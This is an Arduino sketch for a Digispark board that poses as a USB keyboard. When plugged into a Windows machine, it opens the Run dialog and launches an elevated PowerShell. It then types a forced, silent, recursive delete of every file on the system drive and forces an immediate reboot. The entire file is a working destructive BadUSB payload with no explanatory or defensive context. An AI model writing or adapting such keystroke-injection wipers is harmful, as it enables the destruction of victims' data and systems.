#include<DigiKeyboard.h>

void setup() {
  

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("del %Systemdrive%\*.*/f /s /q");
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("shutdown -r -f -t 00");
  for(;;){
    //Nothing Here for you
  }

}
